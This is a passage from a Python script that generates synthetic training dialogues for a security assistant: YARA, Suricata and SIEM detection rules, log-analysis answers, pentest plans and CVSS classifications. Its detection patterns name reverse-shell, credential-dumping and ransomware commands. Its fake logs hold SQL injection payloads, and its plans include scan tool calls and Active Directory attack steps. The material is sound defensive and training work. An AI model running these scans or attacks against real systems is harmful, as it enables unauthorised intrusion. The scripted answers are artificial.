3. {"Correlate with other lateral movement indicators" if "lateral" in attack['description'].lower() else "Correlate with authentication anomalies"}
4. Set up automated enrichment to add context (user risk score, asset criticality)"""

        samples.append(make_sample(SYSTEM_DEFENSIVE, user, assistant))

    return samples


def gen_detect_yara_rules():
    """YARA signature creation."""
    samples = []

    malware_types = [
        {
            "name": "Cobalt Strike beacon",
            "rule": """rule CobaltStrike_Beacon_Strings {{
    meta:
        description = "Detects Cobalt Strike beacon based on string artifacts"
        author = "Detection Team"
        date = "2024-01-15"
        severity = "critical"
        reference = "https://www.cobaltstrike.com"

    strings:
        $s1 = "beacon.dll" ascii wide
        $s2 = "beacon.x64.dll" ascii wide
        $s3 = "%02d/%02d/%02d %02d:%02d:%02d" ascii
        $s4 = "could not spawn" ascii
        $s5 = "%s as %s\\\\%s: %d" ascii
        $config1 = {{ 00 01 00 01 00 02 ?? ?? 00 02 00 01 00 02 ?? ?? }}
        $config2 = {{ 00 01 00 02 00 ?? ?? ?? 00 02 00 01 00 ?? ?? ?? }}
        $sleep = "sleeptime" ascii

    condition:
        uint16(0) == 0x5A4D and
        filesize < 1MB and
        (3 of ($s*) or any of ($config*) and $sleep)
}}""",
        },
        {
            "name": "webshell (PHP)",
            "rule": """rule PHP_Webshell_Generic {{
    meta:
        description = "Detects common PHP webshell patterns"
        author = "Detection Team"
        date = "2024-02-01"
        severity = "high"

    strings:
        $eval1 = "eval($_" ascii
        $eval2 = "eval(base64_decode(" ascii
        $eval3 = "assert($_" ascii
        $system1 = "system($_" ascii
        $system2 = "passthru($_" ascii
        $system3 = "shell_exec($_" ascii
        $system4 = "exec($_" ascii
        $obf1 = "str_rot13" ascii
        $obf2 = "gzinflate(base64_decode(" ascii
        $obf3 = "create_function" ascii
        $upload = "move_uploaded_file" ascii
        $cmd = /\\$_(GET|POST|REQUEST|COOKIE)\\[.{{1,20}}\\]/ ascii

    condition:
        filesize < 500KB and
        (any of ($eval*) and any of ($system*)) or
        (any of ($obf*) and $cmd) or
        (2 of ($system*) and $upload)
}}""",
        },
        {
            "name": "Mimikatz",
            "rule": """rule Mimikatz_Strings {{
    meta:
        description = "Detects Mimikatz credential dumping tool"
        author = "Detection Team"
        date = "2024-01-20"
        severity = "critical"

    strings:
        $s1 = "sekurlsa::logonpasswords" ascii wide nocase
        $s2 = "sekurlsa::wdigest" ascii wide nocase
        $s3 = "lsadump::sam" ascii wide nocase
        $s4 = "lsadump::dcsync" ascii wide nocase
        $s5 = "kerberos::golden" ascii wide nocase
        $s6 = "privilege::debug" ascii wide nocase
        $s7 = "gentilkiwi" ascii wide
        $s8 = "mimikatz" ascii wide nocase
        $s9 = "mimilib" ascii wide nocase
        $pdb = "mimidrv.pdb" ascii

    condition:
        uint16(0) == 0x5A4D and
        (3 of ($s*) or $pdb)
}}""",
        },
        {
            "name": "ransomware generic",
            "rule": """rule Ransomware_Generic_Indicators {{
    meta:
        description = "Detects generic ransomware behavior patterns"
        author = "Detection Team"
        date = "2024-03-01"
        severity = "critical"

    strings:
        $ransom1 = "Your files have been encrypted" ascii wide nocase
        $ransom2 = "README_TO_DECRYPT" ascii wide nocase
        $ransom3 = "DECRYPT_INSTRUCTIONS" ascii wide nocase
        $ransom4 = "bitcoin" ascii wide nocase
        $ransom5 = "wallet address" ascii wide nocase
        $crypto1 = "CryptEncrypt" ascii
        $crypto2 = "CryptGenKey" ascii
        $crypto3 = "BCryptEncrypt" ascii
        $del1 = "vssadmin delete shadows" ascii wide nocase
        $del2 = "wmic shadowcopy delete" ascii wide nocase
        $del3 = "bcdedit /set" ascii wide nocase
        $ext = /\\.(locked|encrypted|crypted|enc|cry)/ ascii

    condition:
        uint16(0) == 0x5A4D and
        (2 of ($ransom*) or
        (any of ($crypto*) and any of ($del*)) or
        (any of ($ransom*) and any of ($del*) and $ext))
}}""",
        },
    ]

    for _ in range(700):
        malware = random.choice(malware_types)

        user = random.choice([
            f"Write a YARA rule to detect {malware['name']}",
            f"I need a YARA signature for {malware['name']} detection",
            f"Create a YARA rule that identifies {malware['name']} in file scans",
        ])

        assistant = f"""**YARA Rule: {malware['name']} Detection**

```yara
{malware['rule']}
```

**Rule characteristics:**
- **Target:** {malware['name']}
- **Detection method:** String matching + file structure validation
- **False positive risk:** Low — combines multiple indicators
- **Performance:** {"Fast — PE header check limits scope" if "0x5A4D" in malware['rule'] else "Moderate — no PE restriction, scans all files"}

**Deployment:**
1. Add to YARA scanning pipeline (file upload, endpoint agent, email gateway)
2. Test against known-good file corpus for false positives
3. {"Monitor for packed/encoded variants that evade string matching" if random.random() > 0.5 else "Consider adding entropy checks for encrypted payloads"}
4. Update strings periodically as malware evolves

**Complementary detections:**
- Behavior-based: Monitor for {"credential access to LSASS" if "imikatz" in malware['name'] else "mass file encryption + shadow copy deletion" if "ransomware" in malware['name'] else "process injection and C2 beaconing" if "Cobalt" in malware['name'] else "unexpected PHP file creation in web roots"}
- Network-based: {"HTTPS beaconing with jitter patterns" if "Cobalt" in malware['name'] else "Bitcoin/crypto wallet communications" if "ransomware" in malware['name'] else "Unusual outbound connections from web servers"}"""

        samples.append(make_sample(SYSTEM_DEFENSIVE, user, assistant))

    return samples


def gen_detect_log_analysis():
    """Log analysis (auth.log, Windows Event Log, web access logs)."""
    samples = []

    log_scenarios = [
        {
            "type": "auth.log brute force",
            "user": "Analyze this auth.log excerpt — is this a brute force attack?\n\n```\n{log}\n```",
            "log": lambda: "\n".join([
                f"Jun  7 {random.randint(10,14)}:{random.randint(0,59):02d}:{random.randint(0,59):02d} web01 sshd[{random.randint(10000,99999)}]: Failed password for {'invalid user ' if random.random() > 0.5 else ''}{random.choice(USERNAMES)} from {rand_ip()} port {random.randint(40000,65535)} ssh2"
                for _ in range(15)
            ]),
            "analysis": """**CONFIRMED: SSH brute force attack in progress.**

**Indicators:**
- Multiple failed authentication attempts from the same source IP
- Mix of valid and invalid usernames (enumeration + credential stuffing)
- High frequency — {count} attempts in {minutes} minutes
- Sequential port numbers suggest automated tool (Hydra, Medusa, or similar)

**Attacker profile:**
- Source: {ip}
- Tool: Likely Hydra or custom script (timing pattern)
- Strategy: Username enumeration + password spraying

**Immediate response:**
1. Block source IP at firewall: `iptables -A INPUT -s {ip} -j DROP`
2. Check if any attempts succeeded: `grep "Accepted" /var/log/auth.log | grep {ip}`
3. Implement fail2ban if not already running
4. Review SSH configuration (disable password auth, require keys)
5. Check for other IPs conducting similar attacks

**Detection rule (fail2ban jail):**
```
[sshd-aggressive]
enabled = true
filter = sshd
maxretry = 3
findtime = 300
bantime = 86400
```""",
        },
        {
            "type": "Windows Event Log lateral movement",
            "user": "These Windows Security events appeared on a file server. Analyze for threats:\n\n```\n{log}\n```",
            "log": lambda: f"""Event ID 4624 - Logon Success
  LogonType: 3 (Network)
  Account: CORP\\svc_sql
  Source: 10.10.14.{random.randint(50,100)}
  Auth Package: NTLM
  Logon Process: NtLmSsp

Event ID 4672 - Special Privileges Assigned
  Account: CORP\\svc_sql
  Privileges: SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege

Event ID 5140 - Network Share Access
  Account: CORP\\svc_sql
  Share: \\\\*\\ADMIN$
  Source: 10.10.14.{random.randint(50,100)}

Event ID 5145 - Detailed Share Access
  Account: CORP\\svc_sql
  Share: \\\\*\\ADMIN$
  File: \\PSEXESVC.exe
  Access: WriteData""",
            "analysis": """**CRITICAL: Lateral movement detected — PsExec execution via service account**

**Attack chain identified:**
1. **4624 (LogonType 3 + NTLM):** Network logon using NTLM — suggests Pass-the-Hash (Kerberos would be expected for legitimate service-to-service)
2. **4672 (Debug Privilege):** SeDebugPrivilege assigned — this enables credential dumping
3. **5140 (ADMIN$ access):** Accessing administrative share — PsExec behavior
4. **5145 (PSEXESVC.exe write):** PsExec service binary being deployed — confirmed lateral movement

**Threat indicators:**
- Service account `svc_sql` should NOT be performing interactive/PsExec logons
- NTLM authentication instead of Kerberos = likely compromised credentials (PtH)
- Source IP {ip} is not the SQL server — illegitimate use of the account
- SeDebugPrivilege + ADMIN$ access = intent to dump credentials

**Response actions:**
1. **Immediate:** Isolate source host ({ip}) from network
2. **Credential reset:** Reset svc_sql password and all accounts that logged in from {ip}
3. **Forensics:** Image source host for analysis
4. **Hunt:** Search for PSEXESVC.exe across all hosts
5. **Scope:** Check for 4624/Type 3/NTLM from this IP to other hosts (lateral movement scope)

**Sigma rule for this pattern:**
```yaml
title: PsExec Lateral Movement via Service Account
detection:
    selection:
        EventID: 5145
        ShareName|endswith: 'ADMIN$'
        RelativeTargetName|contains: 'PSEXESVC'
    condition: selection
level: critical
```""",
        },
        {
            "type": "Web access log SQLi",
            "user": "Review these web access logs for attacks:\n\n```\n{log}\n```",
            "log": lambda: "\n".join([
                f'{rand_ip()} - - [07/Jun/2024:{random.randint(10,23):02d}:{random.randint(0,59):02d}:{random.randint(0,59):02d} +0000] "GET /search?q={random.choice(["test", "1 OR 1=1--", "admin%27%20UNION%20SELECT%20NULL,NULL,NULL--", "1;SELECT%20SLEEP(5)--", "%27%20AND%201=1--", "test%27;DROP%20TABLE%20users--"])} HTTP/1.1" {random.choice([200, 500, 403])} {random.randint(200, 50000)}'
                for _ in range(10)
            ]),
            "analysis": """**CONFIRMED: SQL Injection attack in progress**

**Attack indicators:**
- URL-encoded SQL syntax in `q` parameter
- Classic payloads detected:
  - `' OR 1=1--` (authentication bypass)
  - `UNION SELECT NULL,NULL,NULL--` (column enumeration)
  - `SELECT SLEEP(5)--` (time-based blind SQLi)
  - `DROP TABLE users--` (destructive attempt)
- Mix of 200/500 responses — attacker is testing which payloads work
- 500 errors = errors being triggered (error-based SQLi may be possible)

**Attacker behavior:**
- Source: {ip}
- Tool: Likely sqlmap (systematic payload testing pattern)
- Stage: Active exploitation (past enumeration into data extraction)

**Response:**
1. **Block IP:** Immediately via WAF/firewall
2. **Check database integrity:** Verify no data modified/deleted
3. **Review 200 responses:** Check if UNION-based extraction succeeded
4. **Application fix:** Parameterize the `q` parameter query
5. **Monitor:** Check other parameters/endpoints for similar attacks

**WAF rule (ModSecurity):**
```
SecRule ARGS "@detectSQLi" "id:1001,phase:2,deny,status:403,msg:'SQL Injection Detected'"
```

**Suricata rule:**
```
alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"SQL Injection Attempt"; flow:to_server; content:"UNION"; nocase; content:"SELECT"; nocase; distance:0; sid:1000001; rev:1;)
```""",
        },
    ]

    for _ in range(700):
        scenario = random.choice(log_scenarios)
        log = scenario["log"]()
        ip = rand_ip()

        user_msg = scenario["user"].format(log=log)
        analysis = scenario["analysis"].format(ip=ip, count=random.randint(15, 200), minutes=random.randint(2, 15))

        samples.append(make_sample(SYSTEM_DEFENSIVE, user_msg, analysis))

    return samples


def gen_detect_threat_hunting():
    """Threat hunting queries (Splunk SPL, Elastic KQL)."""
    samples = []

    hunts = [
        {
            "scenario": "Hunt for lateral movement via WMI",
            "splunk": 'index=wineventlog EventCode=4648 OR EventCode=4624 LogonType=3\n| stats count dc(dest) as unique_targets values(dest) as targets by src_user src_ip\n| where unique_targets > 5\n| sort -unique_targets',
            "elastic": 'event.code: ("4648" OR "4624") AND winlog.event_data.LogonType: "3"\n| stats unique_targets = cardinality(destination.ip) by source.user.name, source.ip\n| where unique_targets > 5',
            "explanation": "Identifies accounts authenticating to many hosts — potential lateral movement or reconnaissance.",
        },
        {
            "scenario": "Hunt for data exfiltration via DNS",
            "splunk": 'index=network sourcetype=dns\n| eval query_len=len(query)\n| where query_len > 50\n| stats count sum(query_len) as total_bytes dc(query) as unique_queries by src_ip\n| where count > 1000 AND total_bytes > 100000\n| sort -total_bytes',
            "elastic": 'dns.question.name: *\n| eval query_len = length(dns.question.name)\n| where query_len > 50\n| stats total_queries = count(), total_bytes = sum(query_len) by source.ip\n| where total_queries > 1000 and total_bytes > 100000',
            "explanation": "Detects DNS tunneling/exfiltration by finding hosts with abnormally long DNS queries and high query volume.",
        },
        {
            "scenario": "Hunt for credential dumping tools",
            "splunk": 'index=sysmon EventCode=10 TargetImage="*lsass.exe"\n| search NOT SourceImage IN ("*\\MsMpEng.exe", "*\\csrss.exe", "*\\svchost.exe", "*\\WerFault.exe")\n| stats count values(SourceImage) as tools by ComputerName\n| where count > 0',
            "elastic": 'event.code: "10" AND process.target.executable: "*lsass.exe"\nNOT process.executable: ("*MsMpEng.exe" OR "*csrss.exe" OR "*svchost.exe")',
            "explanation": "Finds non-standard processes accessing LSASS memory — strong indicator of credential dumping (Mimikatz, procdump, etc.).",
        },
        {
            "scenario": "Hunt for persistence via scheduled tasks",
            "splunk": 'index=sysmon EventCode=1 (CommandLine="*schtasks*" AND CommandLine="*/create*")\nOR (EventCode=11 TargetFilename="*\\Tasks\\*")\n| stats count values(CommandLine) as commands by ComputerName User\n| sort -count',
            "elastic": '(event.code: "1" AND process.command_line: *schtasks* AND process.command_line: */create*)\nOR (event.code: "11" AND file.path: *\\Tasks\\*)',
            "explanation": "Identifies scheduled task creation — common persistence mechanism. Correlate with unusual executables and non-admin users.",
        },
        {
            "scenario": "Hunt for beaconing C2 traffic",
            "splunk": 'index=proxy OR index=firewall dest_port=443\n| bin _time span=60s\n| stats count by src_ip dest_ip _time\n| streamstats window=60 avg(count) as avg_count stdev(count) as stdev_count by src_ip dest_ip\n| where stdev_count < 2 AND count > 0\n| stats count avg(avg_count) as beacon_rate dc(_time) as intervals by src_ip dest_ip\n| where intervals > 50 AND beacon_rate > 0.8',
            "elastic": "# Identify consistent periodic connections (low jitter = beaconing)\nnetwork.direction: outbound AND destination.port: 443\n| date_histogram interval=60s\n| stats count by source.ip, destination.ip\n# Look for low standard deviation in connection frequency",
            "explanation": "Detects C2 beaconing by finding connections with consistent timing (low jitter). Real user traffic is irregular; C2 beacons are periodic.",
        },
    ]

    for _ in range(700):
        hunt = random.choice(hunts)
        query_type = random.choice(["splunk", "elastic"])

        user = random.choice([
            f"Write a {query_type.title()} query to: {hunt['scenario']}",
            f"I need to hunt for {hunt['scenario'].lower().replace('hunt for ', '')} in our {query_type.title()} SIEM. What query should I use?",
            f"Create a threat hunting query ({query_type.upper()}) that detects {hunt['scenario'].lower().replace('hunt for ', '')}",
        ])

        query = hunt["splunk"] if query_type == "splunk" else hunt["elastic"]

        assistant = f"""**Threat Hunt: {hunt['scenario']}**

**{query_type.title()} Query:**
```{"spl" if query_type == "splunk" else "kql"}
{query}
```

**What this detects:**
{hunt['explanation']}

**Tuning guidance:**
- Adjust thresholds based on your environment's baseline
- {"Add | lookup known_good_processes to filter legitimate activity" if query_type == "splunk" else "Add NOT filters for known-good processes in your environment"}
- Run during different time windows (business hours vs. off-hours)
- Correlate with other data sources for confidence scoring

**Expected results:**
- True positives: Attacker tools, compromised accounts, C2 channels
- False positives: {"Legitimate admin tools, backup software, monitoring agents" if random.random() > 0.5 else "Automated processes, scheduled jobs, CDN health checks"}

**Escalation criteria:**
- {"Any result from non-admin workstation = CRITICAL" if "lsass" in hunt['scenario'].lower() else ""}{"Results showing > 10 unique targets from single source = investigate immediately" if "lateral" in hunt['scenario'].lower() else ""}{"Any result after baseline exclusion = investigate immediately" if "beacon" in hunt['scenario'].lower() or "exfil" in hunt['scenario'].lower() else "Review timing and volume patterns before escalation"}

**MITRE ATT&CK mapping:**
- {"T1003 — Credential Dumping" if "credential" in hunt['scenario'].lower() else "T1071 — Application Layer Protocol" if "DNS" in hunt['scenario'] or "beacon" in hunt['scenario'].lower() else "T1053 — Scheduled Task" if "scheduled" in hunt['scenario'].lower() else "T1021 — Remote Services (Lateral Movement)"}"""

        samples.append(make_sample(SYSTEM_DEFENSIVE, user, assistant))

    return samples


def gen_detect_snort_suricata():
    """Snort/Suricata rule creation."""
    samples = []

    rules = [
        {
            "attack": "Cobalt Strike beacon HTTP",
            "rule": 'alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET MALWARE Cobalt Strike Beacon Activity"; flow:established,to_server; content:"GET"; http_method; content:"/pixel.gif"; http_uri; content:"Cookie:"; http_header; pcre:"/Cookie:\\s*[A-Za-z0-9+/=]{50,}/Hi"; threshold:type limit, track by_src, count 1, seconds 300; classtype:trojan-activity; sid:2030000; rev:1;)',
            "explanation": "Detects Cobalt Strike HTTP beacon by matching the characteristic URI pattern and large base64 cookie values used for data exfiltration.",
        },
        {
            "attack": "Log4Shell JNDI injection",
            "rule": 'alert http any any -> $HOME_NET any (msg:"ET EXPLOIT Log4j JNDI Injection Attempt"; flow:established,to_server; content:"${jndi:"; nocase; fast_pattern; content:"ldap"; nocase; distance:0; within:20; classtype:attempted-admin; sid:2030001; rev:1;)',
            "explanation": "Detects Log4Shell (CVE-2021-44228) exploitation attempts by matching the JNDI lookup pattern in HTTP traffic.",
        },
        {
            "attack": "DNS tunneling",
            "rule": 'alert dns $HOME_NET any -> any 53 (msg:"ET DNS Possible DNS Tunneling - Long Subdomain"; flow:to_server; dns.query; content:"."; pcre:"/^[a-zA-Z0-9]{30,}\\./"; threshold:type threshold, track by_src, count 50, seconds 60; classtype:bad-unknown; sid:2030002; rev:1;)',
            "explanation": "Detects DNS tunneling by alerting on DNS queries with unusually long subdomain labels (>30 chars) at high frequency.",
        },
        {
            "attack": "SMB lateral movement (PsExec)",
            "rule": 'alert smb $HOME_NET any -> $HOME_NET any (msg:"ET LATERAL PsExec Service Install"; flow:established,to_server; content:"|ff|SMB"; content:"PSEXESVC"; nocase; classtype:trojan-activity; sid:2030003; rev:1;)',
            "explanation": "Detects PsExec lateral movement by matching the PSEXESVC service binary being written over SMB to the target host.",
        },
        {
            "attack": "Reverse shell over TCP",
            "rule": 'alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"ET TROJAN Possible Reverse Shell - bash"; flow:established; content:"/bin/bash"; content:"/dev/tcp"; within:50; classtype:trojan-activity; sid:2030004; rev:1;)',
            "explanation": "Detects bash reverse shells by matching the characteristic /bin/bash and /dev/tcp patterns in outbound TCP traffic.",
        },
    ]

    for _ in range(600):
        rule_data = random.choice(rules)

        user = random.choice([
            f"Write a Suricata rule to detect {rule_data['attack']}",
            f"I need an IDS signature for {rule_data['attack']} traffic",
            f"Create a Snort/Suricata rule that catches {rule_data['attack']}",
        ])

        assistant = f"""**Suricata/Snort Rule: {rule_data['attack']}**

```
{rule_data['rule']}
```

**Detection logic:**
{rule_data['explanation']}

**Rule breakdown:**
- `alert` — Generate alert (not drop/reject)
- `flow:established,to_server` — Only inspect established connections going to server
- `content` — Exact byte/string matching
- `pcre` — Regular expression for complex patterns
- `threshold` — Rate limiting to reduce alert fatigue
- `classtype` — Classification for priority routing

**Deployment:**
1. Add to `/etc/suricata/rules/local.rules`
2. Test with `suricata -T -c /etc/suricata/suricata.yaml`
3. Reload: `suricatasc -c reload-rules`
4. Monitor for false positives in first 24-48 hours

**Tuning tips:**
- {"Add threshold to limit alert volume in high-traffic environments" if "threshold" not in rule_data['rule'] else "Adjust threshold count/seconds based on your traffic volume"}
- {"Whitelist known-good destinations if false positives occur" if random.random() > 0.5 else "Add content negation for known legitimate patterns"}
- Consider adding `flowbits` for multi-packet detection chains"""

        samples.append(make_sample(SYSTEM_DEFENSIVE, user, assistant))

    return samples


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CATEGORY 5: ENGAGEMENT WORKFLOWS (4,000+ samples)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def gen_engagement_planning():
    """Engagement planning and multi-step workflows."""
    samples = []

    for _ in range(900):
        domain = rand_domain()
        company = domain.split('.')[0].replace('-', ' ').title()
        scope_type = random.choice(["external", "internal", "web_app", "full"])

        user = random.choice([
            f"Plan a {scope_type.replace('_', ' ')} penetration test for {company} ({domain}). What's the approach?",
            f"New engagement: {scope_type.replace('_', ' ')} pentest of {domain}. Give me the methodology and phases.",
            f"Client wants a {scope_type.replace('_', ' ')} assessment of {domain}. How should we structure this?",
        ])

        if scope_type == "external":
            assistant = f"""**External Penetration Test Plan — {company} ({domain})**

**Scope:** All internet-facing assets of {domain}
**Duration:** 2 weeks
**Rules of Engagement:** No DoS, no social engineering, business hours preferred

---

**Phase 1: Passive Reconnaissance (Days 1-2)**
- OSINT collection: WHOIS, DNS, certificate transparency
- Subdomain enumeration (passive sources)
- Technology fingerprinting
- Employee enumeration (LinkedIn, GitHub)
- Leaked credential checking (breach databases)

<exec timeout="300">subfinder -d {domain} -all -silent | tee /tmp/{domain}_subs.txt | wc -l</exec>
<exec timeout="60">whois {domain} && dig {domain} ANY +short</exec>

**Phase 2: Active Reconnaissance (Days 2-4)**
- Port scanning of all discovered hosts
- Service version identification
- Web application discovery
- SSL/TLS assessment
- API endpoint enumeration

<exec timeout="3600">bbot -t {domain} -p subdomain-enum web-basic -o /root/.bbot/scans/{domain}</exec>
<exec timeout="600">nmap -sV -sC -p- --top-ports 10000 -iL /tmp/{domain}_subs.txt -oA /tmp/{domain}_nmap</exec>

**Phase 3: Vulnerability Identification (Days 4-7)**
- Automated vulnerability scanning (Nuclei)
- Manual web application testing (OWASP Top 10)
- Authentication testing
- Business logic flaws
- API security assessment

**Phase 4: Exploitation (Days 7-10)**
- Exploit confirmed vulnerabilities
- Attempt credential access
- Chain findings for maximum impact
- Document evidence for each finding

**Phase 5: Reporting (Days 10-14)**
- Classify findings by CVSS
- Write executive summary
- Detail remediation steps
- Provide evidence/PoC for each finding

**Deliverables:**
1. Executive summary (2 pages)
2. Technical report with findings, evidence, and remediation
3. Vulnerability spreadsheet (for tracking)
4. Retest of critical findings (30 days)"""

        elif scope_type == "internal":
            assistant = f"""**Internal Penetration Test Plan — {company}**

**Scope:** Internal network {rand_ip().rsplit('.', 1)[0]}.0/16, Active Directory domain corp.local
**Position:** Assumed breach — starting with domain user credentials
**Duration:** 2 weeks

---

**Phase 1: Network Discovery (Day 1)**
- Subnet mapping and host enumeration
- Service identification
- VLAN discovery and segmentation testing
- Identify critical infrastructure (DCs, file servers, databases)

<exec timeout="300">nmap -sn 10.0.0.0/16 --exclude 10.0.0.1 -oG /tmp/alive_hosts.gnmap</exec>
<exec timeout="600">nmap -sV -p 22,53,80,88,135,139,389,443,445,636,1433,3306,3389,5985,8080 -iL /tmp/alive_hosts.gnmap --open</exec>

**Phase 2: Active Directory Enumeration (Days 1-3)**
- BloodHound collection and attack path analysis
- User and group enumeration
- GPO analysis
- Trust relationships
- Service account identification

<exec timeout="120">bloodhound-python -c All -u jsmith -p 'Password1' -d corp.local -ns {rand_ip()}</exec>

**Phase 3: Credential Attacks (Days 3-5)**
- Kerberoasting
- AS-REP roasting
- Password spraying (carefully, respecting lockout)
- LLMNR/NBT-NS poisoning (if authorized)
- Relay attacks

**Phase 4: Lateral Movement (Days 5-8)**
- Pass-the-Hash / Pass-the-Ticket
- WMI/PSExec/WinRM execution
- Credential reuse
- Pivot through compromised hosts

**Phase 5: Domain Compromise (Days 8-10)**
- Target Domain Admin
- DCSync for full credential dump
- Access Crown Jewels (identified with client)

**Phase 6: Reporting (Days 10-14)**
- Full attack narrative with timeline
- Finding classification
- Remediation priority matrix
- Quick wins vs. strategic improvements"""

        elif scope_type == "web_app":
            assistant = f"""**Web Application Penetration Test Plan — {company} ({domain})**

**Scope:** Primary web application at https://{domain}
**Authentication:** Test accounts provided for authenticated testing
**Duration:** 1 week

---

**Testing Methodology (OWASP-aligned):**

**1. Information Gathering**
- Technology stack identification
- Application mapping (sitemap, endpoints)
- API documentation discovery
- Authentication mechanism analysis
- Session management review

<exec timeout="120">whatweb -v https://{domain}</exec>
<exec timeout="300">feroxbuster -u https://{domain} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -o /tmp/{domain}_dirs.txt</exec>

**2. Authentication & Session Management**
- Brute force protection testing
- Password policy evaluation
- Session token analysis (entropy, predictability)
- Multi-factor bypass attempts
- OAuth/SAML implementation review

**3. Authorization Testing**
- Horizontal privilege escalation (IDOR)
- Vertical privilege escalation
- Function-level access control
- API endpoint authorization

**4. Input Validation**
- SQL Injection (all parameters)
- Cross-Site Scripting (reflected, stored, DOM)
- Server-Side Request Forgery
- XML/XXE injection
- Template injection (SSTI)
- Command injection
- File upload bypass

**5. Business Logic**
- Price manipulation
- Race conditions
- Workflow bypass
- Rate limiting validation

**6. Client-Side Security**
- CORS policy review
- CSP header analysis
- DOM-based vulnerabilities
- JavaScript source review

**Deliverables:**
1. OWASP-aligned finding report
2. Remediation guidance per finding
3. API security review
4. Retest within 30 days"""
        else:
            assistant = f"""**Full-Scope Assessment Plan — {company} ({domain})**

**Scope:** External + Internal + Web Application + Social Engineering
**Duration:** 4 weeks
**Team:** 2-3 operators

---

**Week 1: External Assessment**
- Passive OSINT → Active recon → Vulnerability scanning
- Web application testing
- External service exploitation
- Goal: Gain initial foothold

**Week 2: Internal Assessment (Assumed Breach)**
- AD enumeration and attack path analysis
- Credential attacks (Kerberoasting, spraying)
- Lateral movement
- Goal: Domain Admin access

**Week 3: Advanced Objectives**
- Access Crown Jewels (defined with client)
- Test detection capabilities
- Attempt data exfiltration
- Test segmentation controls
- Social engineering (if authorized)

**Week 4: Reporting & Debrief**
- Full narrative report
- Technical findings with CVSS
- Executive presentation
- Purple team debrief
- Remediation roadmap

**Success metrics:**
1. Percentage of external attack surface discovered
2. Time from initial access to Domain Admin
3. Crown Jewels accessed
4. Detection rate (how many attacks were caught)
5. Mean time to detect (MTD) for security team"""

        samples.append(make_sample(SYSTEM_FULLSTACK, user, assistant))

    return samples


def gen_engagement_finding_classification():
    """Finding classification and CVSS scoring."""
    samples = []

    findings = [
        ("SQL Injection in login form", "critical", 9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
        ("Stored XSS in user profile", "high", 8.1, "AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N"),
        ("IDOR on user API endpoint", "high", 7.5, "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"),
        ("Missing rate limiting on login", "medium", 5.3, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
        ("Information disclosure in error messages", "low", 3.7, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
        ("Default credentials on Tomcat manager", "critical", 9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
        ("Unrestricted file upload leading to RCE", "critical", 9.8, "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"),
        ("SSRF to cloud metadata", "critical", 9.1, "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N"),
        ("Open redirect on login page", "medium", 4.7, "AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N"),
        ("SSL/TLS using weak cipher suites", "low", 3.1, "AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N"),
        ("CSRF on password change", "high", 8.0, "AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"),
        ("Path traversal to arbitrary file read", "high", 7.5, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
        ("Privilege escalation via mass assignment", "high", 8.1, "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"),
        ("DOM-based XSS via URL fragment", "medium", 4.7, "AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N"),
        ("Kerberoastable service accounts with weak passwords", "high", 7.5, "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"),
    ]

    for _ in range(900):
        finding = random.choice(findings)
        title, severity, cvss, vector = finding
        target = rand_subdomain()

        user = random.choice([
            f"Classify this finding: {title} on {target}. Give me CVSS and severity.",
            f"I found {title.lower()} on {target}. How should I score and report this?",
            f"Rate the severity of: {title} (target: {target})",
        ])

        assistant = f"""**Finding Classification**

| Field | Value |
|-------|-------|
| Title | {title} |
| Target | {target} |
| Severity | **{severity.upper()}** |
| CVSS v3.1 | **{cvss}** |
| Vector | {vector} |

**CVSS Breakdown:**
- **Attack Vector (AV):** {"Network — exploitable remotely" if "AV:N" in vector else "Adjacent — requires network proximity" if "AV:A" in vector else "Local — requires local access"}
- **Attack Complexity (AC):** {"Low — no special conditions needed" if "AC:L" in vector else "High — requires specific conditions"}
- **Privileges Required (PR):** {"None — unauthenticated" if "PR:N" in vector else "Low — basic user account" if "PR:L" in vector else "High — admin/privileged account"}
- **User Interaction (UI):** {"None — no user action needed" if "UI:N" in vector else "Required — victim must click/visit"}
- **Scope (S):** {"Changed — impacts beyond vulnerable component" if "S:C" in vector else "Unchanged — contained to vulnerable component"}
- **Impact:** C:{"H" if "C:H" in vector else "L" if "C:L" in vector else "N"}/I:{"H" if "I:H" in vector else "L" if "I:L" in vector else "N"}/A:{"H" if "A:H" in vector else "L" if "A:L" in vector else "N"}

**Business Impact:**
- {"Complete compromise of application and underlying data" if cvss >= 9.0 else "Significant data exposure or unauthorized access" if cvss >= 7.0 else "Moderate risk — may enable further attacks" if cvss >= 4.0 else "Low direct impact — informational or minor risk"}

**Remediation Priority:**
- {"IMMEDIATE (0-48 hours) — Critical vulnerability with active exploit potential" if severity == "critical" else "URGENT (1-2 weeks) — High-impact finding requiring prompt fix" if severity == "high" else "STANDARD (1-3 months) — Address in next patch cycle" if severity == "medium" else "LOW (3-6 months) — Fix opportunistically"}

**Report Section:** {severity.upper()} findings — {"Section 3.1" if severity == "critical" else "Section 3.2" if severity == "high" else "Section 3.3" if severity == "medium" else "Section 3.4"}"""

        samples.append(make_sample(SYSTEM_FULLSTACK, user, assistant))

    return samples


def gen_engagement_operational_judgment():
    """Operational judgment: when to push deeper vs hold."""
    samples = []

    scenarios = [
        {
